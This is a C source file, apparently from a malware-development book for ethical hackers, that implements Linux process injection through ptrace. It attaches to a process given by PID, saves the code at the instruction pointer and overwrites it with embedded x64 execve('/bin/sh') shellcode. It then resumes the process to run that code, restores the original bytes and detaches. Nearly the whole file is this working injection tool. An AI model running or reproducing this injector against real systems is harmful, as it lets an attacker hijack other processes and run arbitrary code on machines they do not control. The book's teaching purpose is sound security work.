/*
 * Malware Development for Ethical Hackers 2nd
 * hack.c
 * practical example of 
 * linux process injection via ptrace
 * author: @cocomelonc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

// helper to read memory from the target process in 8-byte chunks
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
  }
}

// helper to write memory into the target process in 8-byte chunks
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
  }
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    printf("usage: %s <target_pid>\n", argv[0]);
    return 1;
  }

  pid_t target_pid = atoi(argv[1]);
  
  // x64 execve("/bin/sh") shellcode
  char payload[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"; 
  int payload_len = sizeof(payload) - 1;
  char original_code[payload_len];

  struct user_regs_struct target_regs;

  // attach to the target process
  printf("attaching to process %d...\n", target_pid);
  if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
    perror("failed to attach");
    return 1;
  }
  waitpid(target_pid, NULL, 0);

  // get the current cpu registers (find out where RIP is)
  printf("reading process registers...\n");
  ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);

  // backup the memory at the current RIP location
  printf("backing up target memory at %p...\n", (void*)target_regs.rip);
  read_mem(target_pid, target_regs.rip, original_code, payload_len);

  // overwrite the memory at RIP with our shellcode
  printf("injecting payload...\n");
  write_mem(target_pid, target_regs.rip, payload, payload_len);

  // resume execution to run the shellcode
  printf("hijacking execution flow...\n");
  ptrace(PTRACE_CONT, target_pid, NULL, NULL);

  // wait for the payload to trigger or finish (e.g. via a SIGTRAP)
  waitpid(target_pid, NULL, 0);

  // restore the original code to avoid crashing the process
  printf("restoring original memory...\n");
  write_mem(target_pid, target_regs.rip, original_code, payload_len);

  // detach and let the process go about its business
  printf("detaching from process...\n");
  ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

  printf("injection complete. meow! =^..^=\n");
  return 0;
}